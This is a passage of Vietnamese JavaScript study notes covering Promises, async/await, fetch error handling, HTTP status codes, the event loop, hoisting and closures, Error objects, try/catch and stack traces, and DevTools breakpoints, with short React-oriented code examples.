  1. `pending`: Đang chờ xử lý (quán đang nấu trà sữa).
  2. `fulfilled`: Hoàn thành thành công (trà sữa đã nấu xong -> kích hoạt hàm `resolve(value)`).
  3. `rejected`: Thất bại / Bị từ chối (hết nguyên liệu -> kích hoạt hàm `reject(error)`).
- **Tính bất biến (Immutable Guarantee):** Một khi Promise đã chuyển từ `pending` sang `fulfilled` hoặc `rejected`, trạng thái đó được **đóng băng vĩnh viễn**. Không bao giờ có chuyện Promise bị kích hoạt hay đổi trạng thái lần thứ hai!

---

### 4. Xử lý chuỗi Promise: `.then()`, `.catch()`, `.finally()`:
- **Promise Chaining (Chuỗi nối tiếp):**
  - Giá trị mà hàm `.then()` trước `return` ra sẽ trở thành tham số đầu vào cho `.then()` tiếp theo.
  - Nếu giá trị `return` là một Promise mới (như `response.json()` hoặc gọi tiếp `fetch`), `.then()` tiếp theo sẽ **tự động đứng chờ Promise đó hoàn thành** rồi mới bóc dữ liệu ra xử lý tiếp.
- **Xử lý lỗi tập trung:** Dù chuỗi có 10 bước `.then()`, chỉ cần **đúng 1 hàm `.catch()` ở cuối cùng** để tóm gọn mọi lỗi xảy ra ở bất kỳ mắt xích nào.
- **`.finally()`:** Luôn luôn được kích hoạt ở cuối cùng dù thành công hay thất bại (dùng để tắt vòng xoay loading, đóng modal, dọn dẹp tài nguyên).

---

### 5. Cú pháp hiện đại `async / await` & Công thức chuyển đổi:
- **Bản chất ngầm:** `async / await` hoàn toàn **KHÔNG PHẢI công nghệ mới**. Bên dưới nó vẫn sử dụng 100% Promise. Nó là "Cú pháp đường (Syntactic Sugar)" giúp lập trình viên viết code bất đồng bộ nhìn thẳng hàng, trực quan y hệt như code đồng bộ từ trên xuống dưới.
- **Quy tắc:**
  - Từ khóa `async` đặt trước hàm: biến hàm đó thành hàm trả về một Promise.
  - Từ khóa `await` đặt trước Promise: ra lệnh cho JS "hãy kiên nhẫn đứng đợi Promise chạy xong và bóc thẳng kết quả gán vào biến".
- **Công thức chuyển não từ `.then()` sang `await`:**
  - `promiseFn().then(data => { ... })` -> `const data = await promiseFn();`.
  - Toàn bộ code `.catch()` chuyển vào khối `catch (error) { ... }` của `try/catch`.

---

### 6. Bắt lỗi bất đồng bộ với `try / catch / finally`:
- Khi dùng `await`, nếu Promise bị Reject, nó sẽ tự động ném ra một Exception tương đương với câu lệnh `throw error`.
- Bọc toàn bộ các lệnh `await` bên trong khối `try { ... } catch (error) { ... } finally { ... }` để bắt trọn vẹn lỗi và bảo vệ ứng dụng không bị sập màn hình trắng.

---

### 7. Web API: `fetch()` & Bẫy ngộ nhận HTTP 404 / 500:
- 💥 **Bẫy phỏng vấn Senior kinh điển:** 
  Hàm `fetch()` **KHÔNG HỀ TỰ ĐỘNG VĂNG VÀO KHỐI `catch`** khi Server trả về lỗi HTTP `404 Not Found` hay `500 Internal Server Error`!
  - *Lý do:* Đối với `fetch`, việc máy chủ phản hồi về một mã 404/500 vẫn được coi là một giao dịch mạng thành công (đã gửi và nhận gói tin trọn vẹn).
  - `fetch()` **CHỈ THỰC SỰ REJECT (vào `catch`)** khi: Đứt cáp mạng, máy tính mất Wifi, sai tên miền DNS, hoặc bị chặn CORS!
- 👉 **Quy tắc bắt buộc:** Luôn luôn phải tự kiểm tra thuộc tính `response.ok` (trả về `true` nếu status từ 200 đến 299):
  ```javascript
  const res = await fetch(url);
  if (!res.ok) {
    throw new Error(`Lỗi Server phản hồi mã HTTP: ${res.status}`); // Chủ động ném lỗi xuống catch!
  }
  const data = await res.json();
  ```

---

### 8. HTTP Methods & Status Code cơ bản:
- **5 Phương thức HTTP thông dụng (Methods):**
  - `GET`: Đọc / Lấy dữ liệu về từ Server.
  - `POST`: Gửi dữ liệu lên để tạo mới một đối tượng (Đăng ký, tạo đơn hàng).
  - `PUT`: Cập nhật / Ghi đè thay thế toàn bộ đối tượng.
  - `PATCH`: Cập nhật một phần nhỏ của đối tượng (sửa tên, đổi mật khẩu).
  - `DELETE`: Xóa đối tượng.
- **Các nhóm Status Code cần thuộc nằm lòng:**
  - **`2xx` (Thành công):** `200 OK`, `201 Created` (Tạo mới thành công).
  - **`3xx` (Chuyển hướng):** `301 Moved Permanently`, `304 Not Modified` (Dùng cache).
  - **`4xx` (Lỗi do Client / Frontend):**
    - `400 Bad Request`: Dữ liệu gửi lên sai cú pháp / thiếu trường.
    - `401 Unauthorized`: Chưa đăng nhập / Thiếu Access Token.
    - `403 Forbidden`: Đã đăng nhập nhưng không có quyền truy cập (User thường đòi vào Admin).
    - `404 Not Found`: Đường dẫn API không tồn tại.
  - **`5xx` (Lỗi do Server / Backend):**
    - `500 Internal Server Error`: Server sập mã nguồn hoặc chết Database.
    - `502 Bad Gateway` / `503 Service Unavailable`: Server quá tải hoặc đang bảo trì.

---

### 9. Gọi API Tuần tự (Sequential) vs Song song (Parallel) — `Promise.all()` vs `Promise.allSettled()`:
- **Bẫy thác nước (Waterfall Trap):**
  Viết `const a = await getA(); const b = await getB();` khi hai API độc lập nhau sẽ khiến thời gian tải bị cộng dồn vô ích (1s + 1s = 2s).
- **`Promise.all([p1, p2, p3])` (Tải song song - Tối ưu tốc độ):**
  - Nhờ hệ thống đa luồng C++ của trình duyệt, cả 3 request được bắn ra mạng cùng lúc. Tổng thời gian chỉ bằng thời gian của request lâu nhất (1s).
  - 💥 *Bẫy "Được ăn cả ngã về không" (All or Nothing):* Chỉ cần 1 trong 3 Promise bị lỗi (Reject), toàn bộ `Promise.all` lập tức sập xuống `catch`, vứt bỏ kết quả của 2 request thành công kia!
- **`Promise.allSettled([p1, p2, p3])` (An toàn tuyệt đối - ES2020):**
  - Không bao giờ bị văng vào `catch`. Kiên nhẫn chờ tất cả chạy xong và trả về mảng kết quả chi tiết:
    `[ { status: "fulfilled", value: ... }, { status: "rejected", reason: ... } ]`.
  - Phù hợp nhất cho các Dashboard / Giao diện có nhiều Component độc lập (thằng nào lỗi thì báo lỗi riêng, các phần khác vẫn hiển thị bình thường).

---

### 10. Quản lý trạng thái giao diện trong React (Loading, Error, Retry):
- Trong React, khi kết nối API luôn luôn phải duy trì bộ ba State:
  ```javascript
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  ```
- **Quy trình chuẩn:**
  1. Bắt đầu gọi: Bật `setLoading(true)`, xóa lỗi `setError(null)`.
  2. Trong `try`: Gọi API thành công -> `setData(result)`.
  3. Trong `catch`: Bắt lỗi -> `setError(err.message)`.
  4. Trong `finally`: Tắt loading -> `setLoading(false)`.
  5. Cung cấp nút "Thử lại (Retry)" để người dùng bấm gọi lại hàm khi mạng chập chờn.

---

### 11. Hủy request bằng `AbortController` (Chống Race Condition & Memory Leak):
- 💥 **Bẫy Race Condition (Tranh chấp dữ liệu trong ô tìm kiếm):**
  Người dùng gõ "A" (API 1 bay đi, mạng lag mất 2s). Gõ tiếp "AB" (API 2 bay đi, mạng nhanh mất 0.5s). API 2 về trước hiển thị "AB". Nhưng 1.5s sau API 1 mới về, nó đè bẹp kết quả làm màn hình hiển thị danh sách của "A"!
- 💥 **Bẫy Memory Leak:** Người dùng chuyển trang (Unmount Component) trong khi API đang tải dở. Khi API về, nó cố gọi `setState` trên component đã chết.
- 👉 **Giải pháp chuẩn Senior trong React `useEffect`:**
  ```javascript
  useEffect(() => {
    const controller = new AbortController(); // 1. Khởi tạo bộ điều khiển

    fetch(`/api/search?q=${query}`, { signal: controller.signal }) // 2. Gắn tín hiệu hủy
      .then(res => res.json())
      .then(data => setData(data))
      .catch(err => {
        if (err.name === "AbortError") {
          console.log("Đã hủy request cũ thành công!"); // Bỏ qua không báo lỗi
        }
      });

    // 3. Cleanup Function: Hủy ngay request cũ khi query thay đổi hoặc khi rời trang!
    return () => controller.abort();
  }, [query]);
  ```

---
---

## MỤC 9: CƠ CHẾ JAVASCRIPT CẦN HIỂU Ở MỨC VỪA ĐỦ (V8 & RUNTIME)

### 1. Scope & Scope Chain (Phạm vi & Chuỗi tìm kiếm biến):
- **3 Cấp độ Scope:**
  - *Global Scope:* Toàn cục, truy cập ở mọi nơi (nguy cơ ô nhiễm window).
  - *Function Scope:* Khởi tạo bởi `function`, biến bên trong hàm không lọt ra ngoài.
  - *Block Scope (ES6):* Cặp ngoặc nhọn `{}` với `let` và `const` (vòng lặp, `if-else`).
- **Scope Chain (Cơ chế tìm kiếm từ trong ra ngoài):**
  Khi cần đọc một biến, JS Engine luôn tìm trong Local Scope hiện tại trước. Nếu không thấy, nó sẽ leo dần lên Scope cha bên ngoài theo chuỗi Scope Chain cho tới Global Scope. Nếu tới Global vẫn không thấy, nó ném lỗi `ReferenceError`.

---

### 2. Hoisting (Cơ chế kéo khai báo lên đầu Scope):
- **Biến `var`:** Được kéo lên đầu và gán sẵn giá trị `undefined`. Dẫn đến lỗi kinh điển truy cập trước khi gán: `TypeError: Cannot read properties of undefined`.
- **Biến `let` và `const`:** Vẫn được kéo lên đầu (Hoisting), nhưng **KHÔNG ĐƯỢC KHỞI TẠO GIÁ TRỊ**. Vùng từ đầu block tới dòng khai báo gọi là **TDZ (Temporal Dead Zone - Vùng chết tạm thời)**. Truy cập vào TDZ sẽ ném lỗi sập app: `ReferenceError: Cannot access variable before initialization`.
- **Function Declaration vs Function Expression:**
  - *Function Declaration (`function foo() {}`):* Được hoist toàn bộ cả tên và thân hàm -> Gọi trước khi khai báo vẫn chạy bình thường.
  - *Function Expression (`const foo = function() {}`):* Biến `foo` tuân theo quy tắc `const` (nằm trong TDZ), gọi trước sẽ văng lỗi.

---

### 3. Closure và ứng dụng ghi nhớ trạng thái (Tiền đề của React `useState`):
- **Định nghĩa chuẩn 3 điều kiện:**
  1. Có hàm con nằm lồng trong hàm cha.
  2. Hàm con sử dụng biến của hàm cha (Lexical Scope).
  3. Hàm con được "sống sót" đưa ra ngoài phạm vi hàm cha (được return hoặc gắn vào event/timer).
- **Ứng dụng sống còn trong React Hook `useState`:**
  Component trong React chỉ là một hàm bình thường, sau mỗi lần re-render hàm đó chạy xong và biến mất. Làm sao React vẫn nhớ được giá trị State của lần trước?
  👉 Nhờ **Closure**! React tạo ra một mảng các ô nhớ State nằm ngoài Component (trong React Fiber Node), và hàm `useState` tạo ra một bao đóng Closure giữ chặt con trỏ trỏ tới ô nhớ đó, giúp dữ liệu không bao giờ bị dọn rác (Garbage Collected)!

---

### 4. Pass by Value (Tham trị) vs Pass by Reference (Tham chiếu):
- **Primitive (Nguyên thủy - Number, String, Boolean, null, undefined, Symbol, BigInt):**
  Lưu trực tiếp giá trị trên vùng nhớ Stack. Khi gán `b = a`, JS sao chép một bản sao giá trị độc lập. Sửa `b` không ảnh hưởng `a`.
- **Reference (Tham chiếu - Object, Array, Function):**
  Dữ liệu nằm trên vùng nhớ Heap. Biến chỉ lưu **địa chỉ con trỏ (Memory Address)**. Khi gán `obj2 = obj1`, cả hai biến cùng trỏ vào 1 ô nhớ. Sửa `obj2` làm biến dạng luôn `obj1`!
  👉 Nguồn gốc của nguyên tắc Bất biến (Immutability) và các kỹ thuật Shallow Copy / Deep Copy trong State Management.

---

### 5. Từ khóa `this` cơ bản và Arrow Function (Lexical `this`):
- **Hàm thường (`function`):** Từ khóa `this` là **"ba phải"**, hoàn toàn phụ thuộc vào **cách hàm được gọi lúc Runtime** (ai đứng trước dấu chấm `.` lúc gọi: `user.sayName()` thì `this` là `user`; nếu gán `const fn = user.sayName; fn();` thì không có ai trước dấu chấm -> `this` văng ra `window` hoặc `undefined` trong strict mode).
- **Arrow Function (`() => {}`):** **HOÀN TOÀN KHÔNG CÓ `this` CỦA RIÊNG NÓ!** 
  Nó mượn `this` từ phạm vi bao bọc bên ngoài tại thời điểm khai báo (Lexical Scope). Không thể thay đổi `this` của Arrow function bằng `.bind()`, `.call()`, `.apply()`. Cực kỳ an toàn khi truyền làm callback sự kiện trong React.

---

### 6. Event Loop cơ bản: Call Stack, Web APIs, Microtask Queue và Macrotask Queue:
- **Call Stack (Ngăn xếp thực thi):** Sàn diễn chính chạy các dòng lệnh đồng bộ của luồng JS duy nhất.
- **Web APIs:** Hệ thống đa luồng C++ ngầm của Trình duyệt xử lý việc nặng (Timer `setTimeout`, Request `fetch`, Click/Scroll listener).
- **Microtask Queue (Hàng đợi Cửa VIP):** Dành riêng cho **Promise callback** (`.then()`, `.catch()`, `.finally()`, `await`), `queueMicrotask`.
- **Macrotask Queue / Task Queue (Hàng đợi Cửa Phổ thông):** Dành cho `setTimeout`, `setInterval`, `setImmediate`, I/O, Event listener.

---

### 7. Thứ tự ưu tiên thực thi chuẩn mực của Event Loop:
1. **Ưu tiên 1:** Chạy hết sạch 100% tất cả các mã **Đồng bộ** trên Call Stack.
2. **Ưu tiên 2:** Khi Call Stack rỗng, Event Loop **ƯU TIÊN VÉT SẠCH 100% CỬA VIP (Microtask Queue)** trước. Nếu trong lúc chạy Microtask lại đẻ thêm Microtask mới, nó vẫn vét tiếp cho tới khi hàng đợi VIP rỗng toang!
3. **Ưu tiên 3:** Chỉ khi Microtask Queue đã hết sạch, Event Loop mới mở **Cửa Phổ thông (Macrotask Queue)** để bốc ĐÚNG 1 task (`setTimeout`) lên Call Stack chạy.
4. Lặp lại chu trình (Event Loop Tick).

> 📌 **Bài toán kinh điển:**
> ```javascript
> console.log("A");
> setTimeout(() => console.log("B"), 0);
> Promise.resolve().then(() => console.log("C"));
> console.log("D");
> // Kết quả: A -> D -> C -> B
> ```
> *(Giải thích: `A` và `D` chạy đồng bộ trên Call Stack trước. Khi Call Stack rỗng, Promise `C` nằm ở Microtask VIP được bốc lên chạy trước. Cuối cùng mới tới `setTimeout` `B` nằm ở Macrotask phổ thông).*

---

## 10. Xử lý lỗi và debug (Error Handling & Debugging)

---

### 1. Ném lỗi chủ động: `throw new Error("Thông báo lỗi")`:
- **Định nghĩa từ gốc rễ:**
  - `Error`: Là một **Hàm khởi tạo (Constructor Function)** có sẵn được tích hợp sâu trong lõi của ngôn ngữ JavaScript.
  - Khi ta dùng từ khóa `new` kết hợp với `Error("Nội dung thông báo")`, ta đang đúc ra một **Đối tượng lỗi (Error Object)**.
  - **Điểm đặc biệt:** Đối tượng này KHÔNG PHẢI là một object thông thường (như `{}` hay mảng) hay một chuỗi chữ. Nó là một đối tượng đặc quyền được liên kết trực tiếp với tầng sâu của JavaScript Engine (như bộ máy **V8 Engine** của Google Chrome và Node.js).
- **Cấu trúc 4 thuộc tính bên trong một đối tượng `Error`:**
  1. `error.name` (Tên loại lỗi):
     - Mặc định có giá trị là chuỗi `"Error"`. Nếu bạn dùng các lớp lỗi con thì nó sẽ mang tên tương ứng (`"TypeError"`, `"ReferenceError"`...).
     - Thuộc tính này giúp hệ thống và lập trình viên phân loại xem sự cố vừa xảy ra thuộc nhóm lỗi nào để có phương án cấp cứu phù hợp.
  2. `error.message` (Thông điệp lỗi):
     - Là chuỗi văn bản thuần túy do bạn truyền vào bên trong ngoặc tròn `new Error("Tài khoản không đủ số dư")`.
     - Thuộc tính này chứa lời giải thích rõ ràng bằng ngôn ngữ con người đọc được về lý do tại sao dòng code bị nổ. Nó là dữ liệu thường được bóc tách ra để hiển thị cảnh báo lên giao diện cho người dùng hoặc ghi log.
  3. `error.stack` (VŨ KHÍ TỐI THƯỢNG - còn gọi là **Stack Trace / Dấu vết ngăn xếp**):
     - **Đây là thuộc tính giá trị nhất và đặc biệt nhất mà không một kiểu dữ liệu nào khác có được!**
     - *Cơ chế ngầm V8:* Ngay tại khoảnh khắc (mili-giây) lệnh `new Error()` được thực thi, V8 Engine lập tức kích hoạt cơ chế chụp ảnh nội bộ: **chụp một bức ảnh X-quang toàn bộ Call Stack** (ngăn xếp các hàm đang nằm trong bộ nhớ RAM tại đúng thời điểm đó).
     - Bức ảnh X-quang `error.stack` này lưu lại chi tiết đến từng chân tơ kẽ tóc:
       - Tên file đang chạy (kèm đường dẫn tuyệt đối).
       - Số thứ tự dòng code và số thứ tự cột xảy ra sự cố.
       - Toàn bộ lịch sử phân cấp các hàm: Hàm nào gọi hàm nào, hàm đó lại được gọi từ đâu... theo thứ tự từ lúc bắt đầu cho đến đúng vị trí phát nổ!
  4. `error.cause` (Nguyên nhân căn nguyên - Chuẩn mới ES2022):
     - Cho phép bạn xâu chuỗi lỗi (Error Chaining): Khi gặp một lỗi mạng cấp thấp, bạn có thể bọc nó vào một lỗi nghiệp vụ cấp cao: `new Error("Thanh toán thất bại", { cause: errorGoc })`. Thuộc tính `.cause` giúp lưu giữ nguyên vẹn lỗi gốc ban đầu mà không làm mất thông tin.
- **Lệnh `throw` là gì? (Cần phanh khẩn cấp / Phóng ghế phi công):**
  - Từ khóa `throw` là lệnh cưỡng chế dừng chương trình ngay lập tức.
  - Khi gặp `throw`, JavaScript Engine sẽ **lập tức hủy bỏ toàn bộ các dòng code còn lại nằm phía dưới trong hàm đó**, đóng băng tiến trình bình thường và quăng đối tượng lỗi văng ngược lên các tầng hàm cha để tìm người hứng (`catch`).
- **Bẫy phỏng vấn Senior (Tại sao Tech Lead cấm tiệt `throw "string"`?):**
  - *Hiện trường vụ án:* Viết `throw "Lỗi mạng rồi";` thay vì `throw new Error("Lỗi mạng rồi");`.
  - *Hậu quả tai hại nhãn tiền:*
    - Chuỗi string là kiểu nguyên thủy (Primitive), **hoàn toàn KHÔNG CÓ thuộc tính `.message`** (`"Lỗi mạng".message === undefined`). Nếu code của bạn hoặc các thư viện gọi `error.message`, nó sẽ nhận về giá trị `undefined` và hiển thị lên màn hình câu thông báo ngớ ngẩn: *"Lỗi: undefined"*, làm giấu tiệt thông tin thật!
    - Chuỗi string **hoàn toàn KHÔNG CÓ thuộc tính `.stack` (Stack Trace)**: Bạn hoàn toàn bị "mù tịt"! Bạn chỉ thấy một dòng chữ trơ trọi, không tài nào biết được câu chữ đó phát sinh từ file nào, dòng số bao nhiêu giữa một dự án chứa 100.000 dòng code.
    - Trên Console của trình duyệt: `throw "string"` chỉ in ra một dòng chữ chết, **không hề có đường link màu xanh** để bạn click nhảy đến dòng code gây lỗi.
    - Các hệ thống giám sát lỗi tự động trên môi trường thật (như **Sentry**, **Datadog**, **LogRocket**) sẽ bị tê liệt: Chúng không thể bóc tách Stack Trace, không thể gom nhóm lỗi (issue grouping) và không thể gửi cảnh báo chính xác cho đội ngũ kỹ thuật.
- **Gia phả 5 loại lỗi tích hợp (`error.name`) cần thuộc nằm lòng:**
  1. `TypeError` ("Bắt con cá leo cây / Nhầm kiểu dữ liệu"): Chiếm 80% lỗi thực tế khi đi làm. Xảy ra khi bạn bắt một giá trị làm việc mà kiểu dữ liệu của nó không thể làm được. Ví dụ: `null.name`, `undefined.trim()`, hoặc gọi một biến không phải hàm: `const x = 10; x();`.
  2. `ReferenceError` ("Tìm người không tồn tại"): Truy cập một biến chưa từng được khai báo, hoặc gọi biến `let`/`const` trước dòng khai báo (dính bẫy Vùng chết tạm thời TDZ).
  3. `SyntaxError` ("Nói ngọng / Sai ngữ pháp"): Viết sai cú pháp ngữ pháp của JavaScript (thiếu dấu ngoặc nhọn `}`, thừa dấu phẩy, viết sai từ khóa). Lỗi này bị trình phân tích cú pháp (Parser) chặn lại ngay từ khâu đọc code trước khi chương trình kịp chạy một tích tắc nào.
  4. `RangeError` ("Ăn quá no, bể bụng / Vượt giới hạn vật lý"): Giá trị vượt quá biên cho phép của JavaScript. Điển hình nhất là đệ quy vô tận làm tràn ngăn xếp bộ nhớ (`Maximum call stack size exceeded`), hoặc tạo mảng với độ dài âm `new Array(-1)`.
  5. `URIError` ("Ghi sai địa chỉ nhà"): Dùng các hàm xử lý mã hóa đường dẫn web (`decodeURIComponent("%")`) với chuỗi ký tự bị hỏng chuẩn UTF-8.
- **Kết nối React:**
  - Trong React, khi một Component con bị ném lỗi trong quá trình render, toàn bộ cây giao diện sẽ bị sập trắng xóa (White Screen of Death).
  - Để cứu ứng dụng, React cung cấp cơ chế **Error Boundary** (sử dụng lifecycle `componentDidCatch(error, errorInfo)`). Error Boundary sẽ bắt lấy đối tượng `Error`, đọc `error.stack` để gửi về Server giám sát, đồng thời hiển thị một giao diện thay thế nhẹ nhàng (Fallback UI như *"Đã có sự cố, vui lòng tải lại trang"*) thay vì làm sập toàn bộ ứng dụng của người dùng.

---

### 2. Bắt lỗi an toàn: `try / catch / finally`:
- **Định nghĩa 3 khu vực chức năng:**
  - Khối `try { ... }`: Là khu vực dành cho **"Luồng suôn sẻ" (Happy Path)**. Bạn đặt vào đây những đoạn code tiềm ẩn nguy cơ nổ lỗi cao (như gọi API qua mạng, phân tích chuỗi JSON từ Server `JSON.parse()`, đọc dữ liệu người dùng nhập).
  - Khối `catch (error) { ... }`: Là **"Trạm y tế cấp cứu tập trung"**. Bất kỳ khi nào có lỗi nổ ra bên trong lãnh thổ của khối `try` (dù là do hệ thống tự văng ra như `TypeError` hay do bạn chủ động `throw`), JavaScript Engine sẽ lập tức dừng khối `try` và chuyển giao quyền điều khiển xuống đây.
    - *Tham số `error` ở đâu ra?* Chính là quả bóng lỗi (đối tượng `Error`) do khối `try` ném xuống. Khối `catch` đón lấy quả bóng này để bạn ghi log hoặc hiển thị thông báo dịu dàng cho khách hàng.
  - Khối `finally { ... }`: Là **"Đội ngũ dọn dẹp hiện trường"**.
    - **CƠ CHẾ ĐẶC BIỆT:** Khối `finally` **LUÔN LUÔN CHẠY 100%**, bất kể khối `try` chạy thành công rực rỡ hay bị sập gãy rơi vào `catch`.
    - Thậm chí, ngay cả khi bên trong khối `try` hoặc `catch` bạn có gõ lệnh thoát hàm sớm `return`, V8 Engine vẫn bắt buộc phải ghé qua thực thi cho bằng xong khối `finally` rồi mới cho hàm chính thức kết thúc!
    - *Ứng dụng thực tế:* Dùng để tắt vòng xoay Loading (`setLoading(false)`), đóng kết nối Database, hoặc giải phóng tài nguyên.
- **Cơ chế ném bóng - chụp bóng (Exception Propagation / Call Stack Unwinding):**
  - Hãy tưởng tượng các hàm lồng nhau như một tòa nhà nhiều tầng: Hàm `main()` gọi hàm `xemPhim()`, hàm `xemPhim()` gọi hàm `taiVideo()`.
  - Khi hàm sâu nhất là `taiVideo()` gặp lỗi và `throw new Error()`:
    1. Nếu bản thân hàm `taiVideo()` không có khối `try...catch` bọc quanh, V8 Engine sẽ gỡ bỏ hàm này khỏi Call Stack và ném quả bóng lỗi bay ngược lên hàm cha là `xemPhim()`.
    2. Nếu hàm `xemPhim()` cũng không có `try...catch`, quả bóng lỗi tiếp tục bị đẩy bay ngược lên tầng trên nữa là `main()`.
    3. Quá trình leo ngược Call Stack này gọi là **Call Stack Unwinding**. Nó cứ tiếp tục bay ngược lên cho đến khi gặp được một hàm nào có mang "găng tay" `try...catch` thì dừng lại và được khối `catch` xử lý an toàn.
    4. Nếu bay hết sạch các tầng hàm mà vẫn không có ai bắt, quả bóng sẽ văng thẳng ra môi trường toàn cục (Window / Node.js Process), làm in một dòng lỗi đỏ chót `Uncaught Error` lên Console và làm sập tiến trình!
- **Bẫy tử huyệt Bất đồng bộ (Async Gotcha):**
  - `try...catch` đồng bộ **HOÀN TOÀN BẤT LỰC trước callback bất đồng bộ (như `setTimeout`, Event Listener)**:
    ```javascript
    try {
      setTimeout(() => {
        throw new Error("Sập rồi!"); // 💣 Quả bom phát nổ sau 1 giây
      }, 1000);
    } catch (error) {
      console.log("Đã bắt được lỗi:", error.message);
      // ⚠️ CẢNH BÁO: KHỐI CATCH NÀY SẼ KHÔNG BAO GIỜ BẮT ĐƯỢC LỖI TRÊN!
    }
    ```
  - *Bản chất cơ chế ngầm V8 & Event Loop:*
    1. Khi khối `try` chạy, nó gọi `setTimeout` rồi kết thúc ngay trong tích tắc (khoảng 0.1 mili-giây).
    2. Toàn bộ khối `try...catch` đã hoàn thành nhiệm vụ và **đã bị đẩy văng ra khỏi Call Stack từ 1 giây trước**!
    3. Một giây sau, khi timer đếm xong, callback chứa dòng lệnh `throw` mới được Event Loop bốc từ Macrotask Queue đẩy lên Call Stack để chạy. Lúc này trên Call Stack đã hoàn toàn vắng bóng khối `try...catch` bảo vệ -> Lỗi nổ tung thành `Uncaught Error` làm sập app!
  - 👉 *Cách giải cứu chuẩn mực:*
    - Cách 1: Đặt `try...catch` ngay **bên trong chính ruột của hàm callback**.
    - Cách 2: Biến tác vụ bất đồng bộ thành Promise và kết hợp dùng `async / await` (vì từ khóa `await` có khả năng treo dừng luồng của hàm `async` lại ngay tại khối `try`, giữ cho khối `try...catch` tiếp tục tồn tại trên Call Stack để chờ kết quả trả về hoặc bắt lấy lỗi).

---

### 3. Đọc hiểu Error Message và truy vết nguồn gốc qua Stack trace:
- **Cấu trúc giải phẫu của một dòng lỗi đỏ trong Console:**
  Khi một lỗi phát nổ, trên Console sẽ xuất hiện một đoạn văn bản theo mẫu sau:
  ```text
  TypeError: Cannot read properties of undefined (reading 'title')
      at renderMovie (detail.js:45:22)
      at loadMovieDetail (detail.js:18:9)
      at async initPage (detail.js:5:5)
  ```
- **Quy tắc 3 bước đọc hiểu và truy vết tội phạm (Stack Trace):**
  1. **Bước 1: Đọc dòng đầu tiên (Tên lỗi + Thông điệp):**
     - `TypeError`: Chỉ ra bản chất sự cố (đang ép kiểu sai, gọi hàm sai kiểu).
     - `Cannot read properties of undefined (reading 'title')`: Chỉ ra chính xác hành động gây án: Bạn đang dùng dấu chấm `.` để truy cập thuộc tính `.title` từ một thứ có giá trị là `undefined`! (Nghĩa là đối tượng phim `movie` bị `undefined`, không tồn tại).
  2. **Bước 2: Soi vào dòng `at` đầu tiên ngay sát dưới (Tâm chấn của vụ nổ):**
     - `at renderMovie (detail.js:45:22)`:
     - Đây là tọa độ phát nổ đầu tiên: Hàm `renderMovie`, nằm tại file `detail.js`, dòng số **45**, cột số **22**.
     - Trong 90% trường hợp, chỉ cần nhìn vào dòng đầu tiên này là bạn đã tìm ra đúng dòng code gây ra tội lỗi.
  3. **Bước 3: Đọc các dòng `at` tiếp theo từ trên xuống dưới (Hành trình gây án):**
     - Dòng 2: `at loadMovieDetail (detail.js:18:9)` -> Cho biết hàm `renderMovie` không tự nhiên chạy, mà nó được kích hoạt bởi hàm `loadMovieDetail` tại dòng số 18.
     - Dòng 3: `at async initPage (detail.js:5:5)` -> Cho biết hàm `loadMovieDetail` lại được khởi chạy từ hàm `initPage` tại dòng số 5 lúc vừa mở trang web.
  - 👉 **Kỹ năng thực chiến:** Trình duyệt hiện các chữ `detail.js:45:22` dưới dạng **đường link màu xanh gạch chân**. Bạn chỉ cần click chuột trái vào đường link đó, trình duyệt sẽ lập tức mở file và đưa con trỏ nhảy thẳng tới đúng dòng 45 để bạn kiểm tra!

---

### 4. Kỹ thuật Debug trên Browser DevTools (Breakpoint, Điều hướng & Các tab theo dõi):
- **Tại sao lạm dụng `console.log()` là thói quen xấu và nguy hiểm?**
  - Làm bẩn mã nguồn dự án: Khiến code chằng chịt các dòng log tạm bợ, mất thời gian đi tìm và xóa từng dòng trước khi bàn giao sản phẩm.
  - Nguy cơ bảo mật nghiêm trọng: Rất nhiều lập trình viên sơ ý log cả Token đăng nhập, mật khẩu, hoặc thông tin thẻ tín dụng của khách hàng lên Console Production, tạo cơ hội cho hacker đánh cắp dữ liệu.
  - Tính chất bị động và "làm mù": `console.log` chỉ in ra một giá trị chết tại một thời điểm đã trôi qua. Nó không thể cho phép bạn dừng thời gian lại để soi vào các biến xung quanh, không xem được lịch sử các hàm trong RAM.
- **Breakpoint (Điểm dừng đóng băng thời gian) là gì?**
  - Là chiếc "phanh ma thuật" cho phép bạn ra lệnh cho trình duyệt: *"Khi nào luồng chạy của JavaScript chạm tới dòng này, hãy đóng băng toàn bộ chương trình lại ngay lập tức!"*.
  - Tại điểm dừng, thời gian trong JavaScript bị ngưng đọng: Giao diện trên màn hình giữ nguyên trạng thái, và toàn bộ bộ nhớ RAM của trang web tại khoảnh khắc đó được phơi bày hoàn toàn trước mắt bạn.
- **2 Cách đặt Breakpoint trong thực tế:**
  1. *Cách 1 (Thao tác chuột - Sạch sẽ nhất):* Mở tab **Sources** trong DevTools (hoặc mở file trong VS Code) -> Tìm đến dòng code nghi vấn -> Click chuột trái vào khoảng trống bên cạnh số thứ tự dòng code (sẽ xuất hiện một dấu chấm tròn màu xanh hoặc đỏ).
     - *Ưu điểm:* Cực kỳ sạch sẽ, không làm thay đổi bất kỳ ký tự nào trong file mã nguồn.
  2. *Cách 2 (Mã lệnh):* Gõ trực tiếp từ khóa **`debugger;`** vào một dòng code trong file JavaScript.
     - *Cơ chế:* Khi bạn mở F12 DevTools và chạy ứng dụng, hễ gặp dòng chữ `debugger;` này ở bất kỳ đâu, trình duyệt sẽ tự động phanh gấp chương trình lại ngay tại đó giống hệt như một Breakpoint.
- **Kỹ thuật Senior: Conditional Breakpoint (Điểm dừng có điều kiện):**
  - *Tình huống:* Bạn có một vòng lặp chạy qua 10.000 sản phẩm. Bạn biết ứng dụng chỉ bị lỗi ở sản phẩm có `id === 8888` hoặc sản phẩm có giá âm `price < 0`. Nếu đặt Breakpoint thường, bạn sẽ phải bấm F10 thủ công 8.888 lần đến mỏi nhừ tay!
  - *Cách dùng:* Chuột phải vào số thứ tự dòng code -> Chọn **Add conditional breakpoint...** -> Nhập biểu thức logic: `item.id === 8888` hoặc `item.price < 0`.
  - *Hiệu quả:* Trình duyệt sẽ cho 9.999 sản phẩm bình thường chạy qua với tốc độ tối đa, và **CHỈ DỪNG LẠI DUY NHẤT KHI ĐIỀU KIỆN CỦA BẠN TRẢ VỀ `true`**! Tiết kiệm hàng giờ đồng hồ tìm lỗi.
- **Bộ 4 phím tắt điều hướng "tua chậm camera" từng bước:**
